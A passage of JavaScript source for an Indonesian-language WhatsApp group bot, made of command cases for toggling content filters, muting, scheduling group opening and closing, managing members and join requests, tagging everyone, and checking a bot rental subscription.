			break
			case 'antilinktt': {
				if (!m.isGroup) return m.warning(mess.OnlyGrup)
				if (!isAdmins && !isCreator) return m.tolak(mess.GrupAdmin)
				if (!isBotAdmins) return m.tolak(mess.BotAdmin)
				if (args[0] === "on") {
					if (chatsdb[m.chat].antilinktt) return m.reply(`Udah aktif`)
					chatsdb[m.chat].antilinktt = true
					m.reply('Successfully Activate antilinktt In This Group')
				} else if (args[0] === "off") {
					if (!chatsdb[m.chat].antilinktt) return m.reply(`Udah nonaktif`)
					chatsdb[m.chat].antilinktt = false
					m.reply('Successfully Disabling antilinktt In This Group')
				} else {
					let button = [{
						"name": "quick_reply",
						"buttonParamsJson": `{\"display_text\":\"on\",\"id\":\".${command} on\"}`
					}, {
						"name": "quick_reply",
						"buttonParamsJson": `{\"display_text\":\"off\",\"id\":\".${command} off\"}`
					}]
					vreden.sendButtonText(m.chat, button, `*Memasuki ${command} mode*\non -- _mengaktifkan_\noff -- _Menonaktifkan_`, footer, m)
				}
			}
			break
			case 'antiaudio': {
				if (!m.isGroup) return m.warning(mess.OnlyGrup)
				if (!isAdmins && !isCreator) return m.tolak(mess.GrupAdmin)
				if (!isBotAdmins) return m.tolak(mess.BotAdmin)
				if (args[0] === "on") {
					if (chatsdb[m.chat].antiaudio) return m.reply(`Udah aktif`)
					chatsdb[m.chat].antiaudio = true
					m.reply('Successfully Activate Anti Audio In This Group')
				} else if (args[0] === "off") {
					if (!chatsdb[m.chat].antiaudio) return m.reply(`Udah nonaktif`)
					chatsdb[m.chat].antiaudio = false
					m.reply('Successfully Disabling Anti Audio In This Group')
				} else {
					let button = [{
						"name": "quick_reply",
						"buttonParamsJson": `{\"display_text\":\"on\",\"id\":\".${command} on\"}`
					}, {
						"name": "quick_reply",
						"buttonParamsJson": `{\"display_text\":\"off\",\"id\":\".${command} off\"}`
					}]
					vreden.sendButtonText(m.chat, button, `*Memasuki ${command} mode*\non -- _mengaktifkan_\noff -- _Menonaktifkan_`, footer, m)
				}
			}
			break
			case 'antisticker': {
				if (!m.isGroup) return m.warning(mess.OnlyGrup)
				if (!isAdmins && !isCreator) return m.tolak(mess.GrupAdmin)
				if (!isBotAdmins) return m.tolak(mess.BotAdmin)
				if (args[0] === "on") {
					if (chatsdb[m.chat].antisticker) return m.reply(`Udah aktif`)
					chatsdb[m.chat].antisticker = true
					m.reply('Successfully Activate Anti Sticker In This Group')
				} else if (args[0] === "off") {
					if (!chatsdb[m.chat].antisticker) return m.reply(`Udah nonaktif`)
					chatsdb[m.chat].antisticker = false
					m.reply('Successfully Disabling Anti Sticker In This Group')
				} else {
					let button = [{
						"name": "quick_reply",
						"buttonParamsJson": `{\"display_text\":\"on\",\"id\":\".${command} on\"}`
					}, {
						"name": "quick_reply",
						"buttonParamsJson": `{\"display_text\":\"off\",\"id\":\".${command} off\"}`
					}]
					vreden.sendButtonText(m.chat, button, `*Memasuki ${command} mode*\non -- _mengaktifkan_\noff -- _Menonaktifkan_`, footer, m)
				}
			}
			break
			case 'antiimage': {
				if (!m.isGroup) return m.warning(mess.OnlyGrup)
				if (!isAdmins && !isCreator) return m.tolak(mess.GrupAdmin)
				if (!isBotAdmins) return m.tolak(mess.BotAdmin)
				if (args[0] === "on") {
					if (chatsdb[m.chat].antiimage) return m.reply(`Udah aktif`)
					chatsdb[m.chat].antiimage = true
					m.reply('Successfully Activate Anti Image In This Group')
				} else if (args[0] === "off") {
					if (!chatsdb[m.chat].antiimage) return m.reply(`Udah nonaktif`)
					chatsdb[m.chat].antiimage = false
					m.reply('Successfully Disabling Anti Image In This Group')
				} else {
					let button = [{
						"name": "quick_reply",
						"buttonParamsJson": `{\"display_text\":\"on\",\"id\":\".${command} on\"}`
					}, {
						"name": "quick_reply",
						"buttonParamsJson": `{\"display_text\":\"off\",\"id\":\".${command} off\"}`
					}]
					vreden.sendButtonText(m.chat, button, `*Memasuki ${command} mode*\non -- _mengaktifkan_\noff -- _Menonaktifkan_`, footer, m)
				}
			}
			break
			case 'antivideo': {
				if (!m.isGroup) return m.warning(mess.OnlyGrup)
				if (!isAdmins && !isCreator) return m.tolak(mess.GrupAdmin)
				if (!isBotAdmins) return m.tolak(mess.BotAdmin)
				if (args[0] === "on") {
					if (chatsdb[m.chat].antivideo) return m.reply(`Udah aktif`)
					chatsdb[m.chat].antivideo = true
					m.reply('Successfully Activate Anti Video In This Group')
				} else if (args[0] === "off") {
					if (!chatsdb[m.chat].antivideo) return m.reply(`Udah nonaktif`)
					chatsdb[m.chat].antivideo = false
					m.reply('Successfully Disabling Anti Video In This Group')
				} else {
					let button = [{
						"name": "quick_reply",
						"buttonParamsJson": `{\"display_text\":\"on\",\"id\":\".${command} on\"}`
					}, {
						"name": "quick_reply",
						"buttonParamsJson": `{\"display_text\":\"off\",\"id\":\".${command} off\"}`
					}]
					vreden.sendButtonText(m.chat, button, `*Memasuki ${command} mode*\non -- _mengaktifkan_\noff -- _Menonaktifkan_`, footer, m)
				}
			}
			break
			case 'antidocument': {
				if (!m.isGroup) return m.warning(mess.OnlyGrup)
				if (!isAdmins && !isCreator) return m.tolak(mess.GrupAdmin)
				if (!isBotAdmins) return m.tolak(mess.BotAdmin)
				if (args[0] === "on") {
					if (chatsdb[m.chat].antidocument) return m.reply(`Udah aktif`)
					chatsdb[m.chat].antidocument = true
					m.reply('Successfully Activate Anti Document In This Group')
				} else if (args[0] === "off") {
					if (!chatsdb[m.chat].antidocument) return m.reply(`Udah nonaktif`)
					chatsdb[m.chat].antidocument = false
					m.reply('Successfully Disabling Anti Document In This Group')
				} else {
					let button = [{
						"name": "quick_reply",
						"buttonParamsJson": `{\"display_text\":\"on\",\"id\":\".${command} on\"}`
					}, {
						"name": "quick_reply",
						"buttonParamsJson": `{\"display_text\":\"off\",\"id\":\".${command} off\"}`
					}]
					vreden.sendButtonText(m.chat, button, `*Memasuki ${command} mode*\non -- _mengaktifkan_\noff -- _Menonaktifkan_`, footer, m)
				}
			}
			break
			case 'antitoxic': {
				if (!m.isGroup) return m.warning(mess.OnlyGrup)
				if (!isAdmins && !isCreator) return m.tolak(mess.GrupAdmin)
				if (!isBotAdmins) return m.tolak(mess.BotAdmin)
				if (args[0] === "on") {
					if (chatsdb[m.chat].antitoxic) return m.reply(`Udah aktif`)
					chatsdb[m.chat].antitoxic = true
					m.reply('Successfully Activate Antitoxic In This Group')
				} else if (args[0] === "off") {
					if (!chatsdb[m.chat].antitoxic) return m.reply(`Udah nonaktif`)
					chatsdb[m.chat].antitoxic = false
					m.reply('Successfully Disabling Antitoxic In This Group')
				} else {
					let button = [{
						"name": "quick_reply",
						"buttonParamsJson": `{\"display_text\":\"on\",\"id\":\".${command} on\"}`
					}, {
						"name": "quick_reply",
						"buttonParamsJson": `{\"display_text\":\"off\",\"id\":\".${command} off\"}`
					}]
					vreden.sendButtonText(m.chat, button, `*Memasuki ${command} mode*\non -- _mengaktifkan_\noff -- _Menonaktifkan_`, footer, m)
				}
			}
			break
			case 'kickme': {
				if (!m.isGroup) return m.warning(mess.OnlyGrup)
				if (!isAdmins && !isCreator) return m.tolak(mess.GrupAdmin)
				if (!isBotAdmins) return m.tolak(mess.BotAdmin)
				if (args[0] === "on") {
					if (chatsdb[m.chat].kickme) return m.reply(`Udah aktif`)
					chatsdb[m.chat].kickme = true
					m.reply('Successfully Activate Kickme In This Group')
				} else if (args[0] === "off") {
					if (!chatsdb[m.chat].kickme) return m.reply(`Udah nonaktif`)
					chatsdb[m.chat].kickme = false
					m.reply('Successfully Disabling Kickme In This Group')
				} else {
					let button = [{
						"name": "quick_reply",
						"buttonParamsJson": `{\"display_text\":\"on\",\"id\":\".${command} on\"}`
					}, {
						"name": "quick_reply",
						"buttonParamsJson": `{\"display_text\":\"off\",\"id\":\".${command} off\"}`
					}]
					vreden.sendButtonText(m.chat, button, `*Memasuki ${command} mode*\non -- _mengaktifkan_\noff -- _Menonaktifkan_`, footer, m)
				}
			}
			break
			case 'mute': {
				if (!m.isGroup) return m.warning(mess.OnlyGrup)
				if (!isAdmins && !isCreator) return m.tolak(mess.GrupAdmin)
				if (args[0] === "on") {
					if (chatsdb[m.chat].mute) return m.reply(`Udah Mute`)
					chatsdb[m.chat].mute = true
					m.reply('Successfully Mute In This Group')
				} else if (args[0] === "off") {
					if (!chatsdb[m.chat].mute) return m.reply(`Udah Unmute`)
					chatsdb[m.chat].mute = false
					m.reply('Successfully Unmute In This Group')
				} else {
					let button = [{
						"name": "quick_reply",
						"buttonParamsJson": `{\"display_text\":\"on\",\"id\":\".${command} on\"}`
					}, {
						"name": "quick_reply",
						"buttonParamsJson": `{\"display_text\":\"off\",\"id\":\".${command} off\"}`
					}]
					vreden.sendButtonText(m.chat, button, `*Memasuki ${command} mode*\non -- _mengaktifkan_\noff -- _Menonaktifkan_`, footer, m)
				}
			}
			break
			case 'antidelete': {
				if (!isCreator) return m.tolak(mess.OnlyOwner)
				if (args[0] === "on") {
					if (setting.antiDelete) return m.reply(`Udah aktif`)
					setting.antiDelete = true
					m.reply('Successfully Activate antidelete In This bot')
				} else if (args[0] === "off") {
					if (!setting.antiDelete) return m.reply(`Udah nonaktif`)
					setting.antiDelete = false
					m.reply('Successfully Disabling antidelete In This bot')
				} else {
					let button = [{
						"name": "quick_reply",
						"buttonParamsJson": `{\"display_text\":\"on\",\"id\":\".${command} on\"}`
					}, {
						"name": "quick_reply",
						"buttonParamsJson": `{\"display_text\":\"off\",\"id\":\".${command} off\"}`
					}]
					vreden.sendButtonText(m.chat, button, `*Memasuki ${command} mode*\non -- _mengaktifkan_\noff -- _Menonaktifkan_`, footer, m)
				}
			}
			break
			case 'antionce':
			case 'antivo':
			case 'antiviewonce': {
				if (!isCreator) return m.tolak(mess.OnlyOwner)
				if (args[0] === "on") {
					if (setting.antiViewOnce) return m.reply(`Udah aktif`)
					setting.antiViewOnce = true
					m.reply('Successfully Activate Anti view once In This bot')
				} else if (args[0] === "off") {
					if (!setting.antiViewOnce) return m.reply(`Udah nonaktif`)
					setting.antiViewOnce = false
					m.reply('Successfully Disabling Anti view once In This bot')
				} else {
					let button = [{
						"name": "quick_reply",
						"buttonParamsJson": `{\"display_text\":\"on\",\"id\":\".${command} on\"}`
					}, {
						"name": "quick_reply",
						"buttonParamsJson": `{\"display_text\":\"off\",\"id\":\".${command} off\"}`
					}]
					vreden.sendButtonText(m.chat, button, `*Memasuki ${command} mode*\non -- _mengaktifkan_\noff -- _Menonaktifkan_`, footer, m)
				}
			}
			break
			case 'antiwame': {
				if (!m.isGroup) return m.warning(mess.OnlyGrup)
				if (!isAdmins && !isCreator) return m.tolak(mess.GrupAdmin)
				if (!isBotAdmins) return m.tolak(mess.BotAdmin)
				if (args[0] === "on") {
					if (chatsdb[m.chat].antiwame) return m.reply(`Udah aktif`)
					chatsdb[m.chat].antiwame = true
					m.reply('Successfully Activate Antiwame In This Group')
				} else if (args[0] === "off") {
					if (!chatsdb[m.chat].antiwame) return m.reply(`Udah nonaktif`)
					chatsdb[m.chat].antiwame = false
					m.reply('Successfully Disabling Antiwame In This Group')
				} else {
					let button = [{
						"name": "quick_reply",
						"buttonParamsJson": `{\"display_text\":\"on\",\"id\":\".${command} on\"}`
					}, {
						"name": "quick_reply",
						"buttonParamsJson": `{\"display_text\":\"off\",\"id\":\".${command} off\"}`
					}]
					vreden.sendButtonText(m.chat, button, `*Memasuki ${command} mode*\non -- _mengaktifkan_\noff -- _Menonaktifkan_`, footer, m)
				}
			}
			break
			case 'antiwame2': {
				if (!m.isGroup) return m.warning(mess.OnlyGrup)
				if (!isAdmins && !isCreator) return m.tolak(mess.GrupAdmin)
				if (!isBotAdmins) return m.tolak(mess.BotAdmin)
				if (args[0] === "on") {
					if (chatsdb[m.chat].antiwame2) return m.reply(`Udah aktif`)
					chatsdb[m.chat].antiwame2 = true
					m.reply('Successfully Activate antiwame2 In This Group')
				} else if (args[0] === "off") {
					if (!chatsdb[m.chat].antiwame2) return m.reply(`Udah nonaktif`)
					chatsdb[m.chat].antiwame2 = false
					m.reply('Successfully Disabling antiwame2 In This Group')
				} else {
					let button = [{
						"name": "quick_reply",
						"buttonParamsJson": `{\"display_text\":\"on\",\"id\":\".${command} on\"}`
					}, {
						"name": "quick_reply",
						"buttonParamsJson": `{\"display_text\":\"off\",\"id\":\".${command} off\"}`
					}]
					vreden.sendButtonText(m.chat, button, `*Memasuki ${command} mode*\non -- _mengaktifkan_\noff -- _Menonaktifkan_`, footer, m)
				}
			}
			break
			case 'opentime': {
				if (!m.isGroup) return m.warning(mess.OnlyGrup)
				if (!isAdmins && !isCreator) return m.tolak('Lu Siapa Kocak')
				if (!isBotAdmins) return m.tolak(mess.BotAdmin)
				if (args[1] == 'detik') {
					var timer = args[0] * `1000`
				} else if (args[1] == 'menit') {
					var timer = args[0] * `60000`
				} else if (args[1] == 'jam') {
					var timer = args[0] * `3600000`
				} else if (args[1] == 'hari') {
					var timer = args[0] * `86400000`
				} else {
					return m.warning('*Pilih:*\ndetik\nmenit\njam\n\n*Contoh*\n10 detik')
				}
				m.reply(`Grup Akan Dibuka Dalam ${q} Dimulai Dari Sekarang`)
				setTimeout(() => {
					var nomor = m.participant
					const open = `Grup Telah Di Buka Oleh Admin\nSekarang Semua Member Dapat Mengirim Pesan`
					vreden.groupSettingUpdate(m.chat, 'not_announcement')
					m.reply(open)
				}, timer)
			}
			break
			case 'open':
			case 'buka': {
				if (!m.isGroup) return m.warning(mess.OnlyGrup)
				if (!isAdmins && !isCreator) return m.tolak(mess.GrupAdmin)
				if (!isBotAdmins) return m.tolak(mess.BotAdmin)
				vreden.groupSettingUpdate(m.chat, 'not_announcement')
				const textOpen = chatsdb[m.chat].setopen
				m.reply(textOpen ? textOpen : `Sukses mengizinkan semua peserta dapat mengirim pesan ke grup ini`)
				break
			}
			case 'setopen': {
				if (!m.isGroup) return m.warning(mess.OnlyGrup)
				if (!isCreator) return m.tolak(mess.OnlyOwner)
				if (!text) return m.warning(`Gunakan dengan cara ${prefix+command} *teks open*\n\n_Contoh_\n\n${prefix+command} Halo Semuanya, group sudah buka`)
				chatsdb[m.chat].setopen = text
				m.reply(`✅ Done set open!`)
			}
			break
			case 'delsetopen': {
				if (!m.isGroup) return m.warning(mess.OnlyGrup)
				if (!isCreator) return m.tolak(mess.OnlyOwner)
				if (!chatsdb[m.chat].setopen) return m.warning(`Belum ada set open di sini..`)
				chatsdb[m.chat].setopen = false
				m.reply(`Sukses delete set open`)
			}
			break
			case 'tutupjam': {
				if (!m.isGroup) return m.warning(mess.OnlyGrup)
				if (!isAdmins && !isCreator) return m.tolak('Lu Siapa Kocak')
				if (!isBotAdmins) return m.tolak(mess.BotAdmin)
				var jm = text.split(':')[0]
				var mnt = text.split(':')[1]
				if (jm > 23) return m.warning(`Masukan Waktu dengan benar\n*Contoh:*\n\n.tutupjam 18:00`)
				if (mnt > 59) return m.warning(`Masukan Waktu dengan benar\n*Contoh:*\n\n.tutupjam 18:00`)
				if ((isNaN(jm))) return m.warning(`Masukan Waktu dengan benar\n*Contoh:*\n\n.bukajam 18:00`)
				if ((isNaN(mnt))) return m.warning(`Masukan Waktu dengan benar\n*Contoh:*\n\n.bukajam 18:00`)
				if (!jm && !mnt) return m.warning(`Masukan Jam nya\n*Contoh:*\n\n.tutupjam 18:00`)
				m.reply(`Group Akan Ditutup Jam ${jm}:${mnt} WIB`)
				cron.schedule(`0 ${mnt} ${jm} * * *`, async () => {
					vreden.groupSettingUpdate(m.chat, 'announcement')
					m.reply(`Grup Di Tutup Oleh Admin\nSekarang Hanya Admin Yang Dapat Mengirim Pesan`)
				}, {
					scheduled: true,
					timezone: 'Asia/Jakarta'
				})
			}
			break
			case 'bukajam': {
				if (!m.isGroup) return m.warning(mess.OnlyGrup)
				if (!isAdmins && !isCreator) return m.tolak('Lu Siapa Kocak')
				if (!isBotAdmins) return m.tolak(mess.BotAdmin)
				var jm = text.split(':')[0]
				var mnt = text.split(':')[1]
				if (jm > 23) return m.warning(`Masukan Waktu dengan benar\n*Contoh:*\n\n.bukajam 18:00`)
				if (mnt > 59) return m.warning(`Masukan Waktu dengan benar\n*Contoh:*\n\n.bukajam 18:00`)
				if ((isNaN(jm))) return m.warning(`Masukan Waktu dengan benar\n*Contoh:*\n\n.bukajam 18:00`)
				if ((isNaN(mnt))) return m.warning(`Masukan Waktu dengan benar\n*Contoh:*\n\n.bukajam 18:00`)
				if (!jm && !mnt) return m.warning(`Masukan Jam nya\n*Contoh:*\n\n.bukajam 18:00`)
				m.reply(`Group Akan Dibuka Jam ${jm}:${mnt} WIB`)
				cron.schedule(`0 ${mnt} ${jm} * * *`, async () => {
					vreden.groupSettingUpdate(m.chat, 'not_announcement')
					m.reply(`Grup Di Buka Oleh Admin\nSekarang Semua Peserta Dapat Mengirim Pesan`)
				}, {
					scheduled: true,
					timezone: 'Asia/Jakarta'
				})
			}
			break
			case 'closetime': {
				if (!m.isGroup) return m.warning(mess.OnlyGrup)
				if (!isAdmins && !isCreator) return m.tolak('Lu Siapa Kocak')
				if (!isBotAdmins) return m.tolak(mess.BotAdmin)
				if (args[1] == 'detik') {
					var timer = args[0] * `1000`
				} else if (args[1] == 'menit') {
					var timer = args[0] * `60000`
				} else if (args[1] == 'jam') {
					var timer = args[0] * `3600000`
				} else if (args[1] == 'hari') {
					var timer = args[0] * `86400000`
				} else {
					return m.warning('*Pilih:*\ndetik\nmenit\njam\n\n*Contoh*\n10 detik')
				}
				m.reply(`Group Akan Ditutup Dalam ${q} Di Mulai Dari Sekarang`)
				setTimeout(() => {
					var nomor = m.participant
					const close = `Grup Di Tutup Oleh Admin\nSekarang Hanya Admin Yang Dapat Mengirim Pesan`
					vreden.groupSettingUpdate(m.chat, 'announcement')
					m.reply(close)
				}, timer)
			}
			break
			case 'close':
			case 'tutup': {
				if (!m.isGroup) return m.warning(mess.OnlyGrup)
				if (!isAdmins && !isCreator) return m.tolak(mess.GrupAdmin)
				if (!isBotAdmins) return m.tolak(mess.BotAdmin)
				vreden.groupSettingUpdate(m.chat, 'announcement')
				const textClose = chatsdb[m.chat].setclose
				m.reply(textClose ? textClose : `Sukses mengizinkan hanya admin yang dapat mengirim pesan ke grup ini`)
			}
			break
			case 'setclose': {
				if (!m.isGroup) return m.warning(mess.OnlyGrup)
				if (!isCreator) return m.tolak(mess.OnlyOwner)
				if (!text) return m.warning(`Gunakan dengan cara ${prefix+command} *teks close*\n\n_Contoh_\n\n${prefix+command} Halo Semuanya, group close dulu ya`)
				chatsdb[m.chat].setclose = text
				m.reply(`✅ Done set close!`)
			}
			break
			case 'delsetclose': {
				if (!m.isGroup) return m.warning(mess.OnlyGrup)
				if (!isCreator) return m.tolak(mess.OnlyOwner)
				if (!chatsdb[m.chat].setclose) return m.warning(`Belum ada set close di sini..`)
				chatsdb[m.chat].setclose = false
				m.reply(`Sukses delete set close`)
			}
			break
			case 'cekasalmember': {
				if (!m.isGroup) return m.warning(mess.OnlyGrup)
				const participants = await vreden.groupMetadata(m.chat).then(metadata => metadata.participants);

				let teks = `*GLOBAL COUNTRY MEMBER:*\n\n`
				const hitungNegara = {};
				const total = participants.length;

				participants.forEach(participant => {
					const phoneNumber = "+" + participant.id.split('@')[0];
					const negara = getCountryFromPhoneNumber(phoneNumber);
					if (hitungNegara[negara]) {
						hitungNegara[negara]++;
					} else {
						hitungNegara[negara] = 1;
					}
				});

				const hasil = {};
				for (const [negara, jumlah] of Object.entries(hitungNegara)) {
					hasil[negara] = {
						jumlah: jumlah,
						persentase: ((jumlah / total) * 100).toFixed(2) + "%"
					};
				}

				Object.entries(hasil).map(([negara, {
					jumlah,
					persentase
				}]) => {
					teks += `*${negara}:*\n- jumlah: ${jumlah} (${persentase})\n\n`
				})
				m.sendForward(teks)
			}
			break;
			case 'sider':
			case 'gcsider': {
				var lama = 86400000 * 7
				const now = new Date().toLocaleString("en-US", {
					timeZone: "Asia/Jakarta"
				});
				const milliseconds = new Date(now).getTime();

				let member = groupMetadata.participants.map(v => v.id)
				if (!text) {
					var pesan = "Harap aktif di grup karena akan ada pembersihan member setiap saat"
				} else {
					var pesan = text
				}
				var sum
				sum = member.length
				var total = 0
				var sider = []
				for (let i = 0; i < sum; i++) {
					let users = m.isGroup ? groupMetadata.participants.find(u => u.id == member[i]) : {}
					if ((typeof usersdb[member[i]] == 'undefined' || milliseconds * 1 - usersdb[member[i]].lastseen > lama) && !users.isAdmin && !users.isSuperAdmin) {
						if (typeof usersdb[member[i]] !== 'undefined') {
							if (usersdb[member[i]].banned == true) {
								total++
								sider.push(member[i])
							}
						} else {
							total++
							sider.push(member[i])
						}
					}
				}
				if (total == 0) return m.reply(`*Digrup ini tidak terdapat sider.*`)
				m.sendMentions(`*${total}/${sum}* anggota grup *${groupName}* adalah sider dengan alasan :\n1. Tidak aktif selama lebih dari 7 hari\n2. Baru join tetapi tidak pernah nimbrung\n\n_“${pesan}”_\n\n*LIST SIDER :*\n${sider.map(v => '  ○ @' + v.replace(/@.+/, '' + typeof usersdb[v] == "undefined" ? ' Sider ' : ' Off ' + msToDate(milliseconds * 1 - usersdb[v].lastseen))).join('\n')}`)
			}
			break
			case 'hedsot':
			case 'buang':
			case 'kick': {
				if (!m.isGroup) return m.warning(mess.OnlyGrup)
				if (!isCreator && !isAdmins) return m.tolak(mess.GrupAdmin)
				if (!isBotAdmins) return m.tolak(mess.BotAdmin)
				if (!m.quoted && !m.mentionedJid[0] && isNaN(parseInt(args[0]))) return m.warning('Tag/reply pesan target yang ingin di kick!')
				let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
				if (ownerNumber.includes(users)) return m.warning('Tidak Dapat Melakukannya Kepada Owner')
				if (!m.mentionedJid[0] && !m.quoted && !text) return m.warning(`Tag/Reply Target Yang Mau Di ${command}`)
				await vreden.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => m.reply('🗿 Done Kick :v')).catch((err) => m.reply('Tag/reply pesan target yang ingin di kick!'))
			}
			break
			case 'acc': {
				if (!m.isGroup) return m.warning(mess.OnlyGrup)
				if (!isCreator && !isAdmins) return m.tolak(mess.GrupAdmin)
				if (!isBotAdmins) return m.tolak(mess.BotAdmin)
				const groupId = m.chat;
				const [subCommand, options] = args;
				const joinRequestList = await vreden.groupRequestParticipantsList(groupId);

				switch (subCommand) {
					case 'list': {
						const formattedRequests = joinRequestList.length > 0 ?
							joinRequestList.map((request, i) => {
								const timestamp = request.request_time;
								return `*${i + 1}.*\n• Nomor: ${request.jid.split('@')[0]}\n• Metode Permintaan: ${request.request_method}\n• Waktu Permintaan: ${new Intl.DateTimeFormat('id-ID', {
                weekday: 'long',
                day: 'numeric',
                month: 'long',
                year: 'numeric'
              }).format(new Date(1e3 * timestamp))}\n\n`;
							}).join('') :
							'Tidak ada permintaan bergabung yang tertunda.';
						reply(`*Daftar Permintaan Bergabung:*\n\n${formattedRequests}`);
						break;
					}
					case 'reject':
					case 'approve': {
						if (options === 'all') {
							for (const request of joinRequestList) {
								await vreden.groupRequestParticipantsUpdate(groupId, [request.jid], subCommand);
								console.log(`Meng-${subCommand} participant dengan JID: ${request.jid}`);
							}
							reply(`*${subCommand === 'approve' ? 'Menyetujui' : 'Menolak'} semua permintaan bergabung.*`);
						} else {
							const participants = options.split('|').map(action => action.trim()).map(action => joinRequestList[parseInt(action) - 1]).filter(request => request);
							if (participants.length > 0) {
								let formattedResponse = '';
								for (const request of participants) {
									const response = await vreden.groupRequestParticipantsUpdate(groupId, [request.jid], subCommand);
									const status = response[0]?.status === 'success' ? 'Gagal' : 'Berhasil';
									formattedResponse += `*${participants.indexOf(request) + 1}.*\n• Status: ${status}\n• Nomor: ${request.jid.split('@')[0]}\n\n`;
									console.log(`Meng-${subCommand} participant dengan JID: ${request.jid}`);
								}
								reply(`*${subCommand === 'approve' ? 'Menyetujui' : 'Menolak'} Permintaan Bergabung:*\n\n${formattedResponse}`);
							} else {
								reply('Tidak ada anggota yang cocok untuk reject/approve.');
							}
						}
						break;
					}
					default:
						reply('*Perintah tidak valid.*\nGunakan:\n- *acc list*\n- *acc approve [number]*\n- *acc reject [number]*\n- *acc reject [JID]*\n- *acc reject/approve all* untuk menolak/menyetujui semua permintaan bergabung.');
				}
			}
			break
			case 'add': {
				if (!m.isGroup) return m.warning(mess.OnlyGrup)
				if (!isCreator && !isAdmins) return m.tolak(mess.GrupAdmin)
				if (!isBotAdmins) return m.tolak(mess.BotAdmin)
				if (!m.quoted && !m.mentionedJid[0] && isNaN(parseInt(args[0]))) return m.warning('Tag/reply pesan target yang ingin di add!')
				let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
				if (!m.mentionedJid[0] && !m.quoted && !text) return m.warning(`Tag/Reply Target Yang Mau Di ${command}`)
				await vreden.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => m.reply('Sukses Add Sepuh ✅')).catch((err) => m.reply('❌ Terjadi kesalahan, mungkin nmr nya privat'))
			}
			break
			case 'promote':
			case 'pm': {
				if (!m.isGroup) return m.warning(mess.OnlyGrup)
				if (!isCreator && !isAdmins) return m.tolak(mess.GrupAdmin)
				if (!isBotAdmins) return m.tolak(mess.BotAdmin)
				if (!m.quoted && !m.mentionedJid[0] && isNaN(parseInt(args[0]))) return m.warning('Tag/reply pesan target yang ingin di jadikan admin!')
				let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
				if (!m.mentionedJid[0] && !m.quoted && !text) return m.warning(`Tag/Reply Target Yang Mau Di ${command}`)
				await vreden.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => m.reply('Sukses promote member✅')).catch((err) => m.reply('❌ Terjadi kesalahan'))
			}
			break
			case 'demote':
			case 'dm': {
				if (!m.isGroup) return m.warning(mess.OnlyGrup)
				if (!isCreator && !isAdmins) return m.tolak(mess.GrupAdmin)
				if (!isBotAdmins) return m.tolak(mess.BotAdmin)
				if (!m.quoted && !m.mentionedJid[0] && isNaN(parseInt(args[0]))) return m.warning('Tag/reply pesan target yang ingin di un admin!')
				let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
				if (!m.mentionedJid[0] && !m.quoted && !text) return m.warning(`Tag/Reply Target Yang Mau Di ${command}`)
				await vreden.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => m.reply('Sukses demote admin✅')).catch((err) => m.reply('❌ Terjadi kesalahan'))
			}
			break
			case 'revoke':
				if (!m.isGroup) return m.warning(mess.OnlyGrup)
				if (!isAdmins && !isCreator) return m.tolak(mess.GrupAdmin)
				if (!isBotAdmins) return m.tolak(mess.BotAdmin)
				await vreden.groupRevokeInvite(m.chat)
					.then(res => {
						m.reply(`Sukses menyetel tautan undangan grup ini`)
					}).catch(() => m.reply(mess.error.api))
				break
			case 'tagall': {
				if (!m.isGroup) return m.warning(mess.OnlyGrup)
				if (!isAdmins && !isCreator) return m.tolak('Lu Siapa?')
				if (!isBotAdmins) return m.tolak('Bot Harus Jad Admin!')
				let teks = `*👥 Tag All By Admin*
 
🗞️ *Pesan : ${q ? q : 'kosong'}*

@${m.chat}`
				vreden.sendMessage(m.chat, {
					text: teks,
					contextInfo: {
						mentionedJid: participants.map(a => a.id),
						groupMentions: [{
							groupJid: m.chat,
							groupSubject: "semua orang"
						}]
					}
				}, {
					quoted: m
				})
			}
			break
			case 'totag': {
				if (!m.isGroup) return m.warning(mess.OnlyGrup)
				if (!isAdmins && !isCreator) return m.tolak(mess.GrupAdmin)
				if (!isBotAdmins) return m.warning('Bot Harus Admin!')
				if (!m.quoted) return m.warning(`Replay Pesan Dengan Caption ${prefix + command}`)
				vreden.sendMessage(m.chat, {
					forward: m.quoted.fakeObj,
					mentions: participants.map(a => a.id)
				})
			}
			break
			case 'h':
			case 'hidetag': {
				if (!m.isGroup) return m.warning(mess.OnlyGrup)
				if (!isAdmins && !isCreator) return m.tolak(mess.GrupAdmin)
				if (m.quoted) {
					vreden.sendMessage(m.chat, {
						forward: m.quoted.fakeObj,
						mentions: participants.map(a => a.id)
					})
				}
				if (!m.quoted) {
					vreden.sendMessage(m.chat, {
						text: q ? q : '',
						mentions: participants.map(a => a.id)
					}, {
						quoted: fchannel
					})
				}
			}
			break
			case 'delete':
			case 'd':
			case 'del': {
				if (!m.quoted) return m.reply('Reply pesan yang mau di hapus')
				await vreden.sendMessage(m.chat, {
					delete: {
						remoteJid: m.chat,
						id: m.quoted.id,
						participant: m.quoted.sender
					}
				})
			}
			break
			case 'checksewa':
			case 'ceksewa': {
				if (!m.isGroup) return m.warning(mess.OnlyGrup)
				if (!isSewa) return m.tolak(`Bot tidak di sewa group ini!`)
				let ceksewa = ms(_sewa.getSewaExpired(m.chat) - Date.now())
				let teks = `*</> SEWA BOT INFO </>*

*Subscribe Info* :
- Grup : ${m.chat.split("@")[0]}
- Expired : ${ceksewa.days}D
- Countdown :
${ceksewa.days} hari, ${ceksewa.hours} jam, ${ceksewa.minutes} menit

*Benefit Info* :
- Feature : 1300++
- Management : Yes 
- Request : 1/5s
- VIP Access : No
- Grup Priority : Yes
- Protection : Yes
`
            		const contentText = {
            			text: teks,
            			contextInfo: {
            				mentionedJid: vreden.ments(teks),
            				externalAdReply: {
        					title: `GROUP SEWA 💫`,
        					previewType: "PHOTO",
        					thumbnailUrl: `https://pomf2.lain.la/f/yy6atxpc.jpg`,
        					sourceUrl: setting.tiktok
            				}
            			}
            		};
            		return vreden.sendMessage(m.chat, contentText, {
                    			quoted: m,
                    		});
			}
			break
			// Game Menu
